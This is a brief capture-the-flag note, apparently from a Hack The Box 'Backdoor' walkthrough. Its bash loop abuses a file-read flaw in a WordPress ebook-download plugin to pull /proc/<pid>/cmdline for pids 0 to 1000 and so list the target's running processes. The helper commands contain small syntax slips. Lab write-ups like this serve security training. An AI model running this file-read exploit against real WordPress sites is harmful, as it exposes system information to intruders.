#### Enum procs
```bash
for i in $(seq 0 1000); do curl "http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/${i}/cmdline" --output - | cut -d'/' -f 8- | sed 's/<script.*//g>' > $i; done
```
`for i in $(find . type f -size +20c); do cat $i | sed 's/cmdline/\t/g'; done`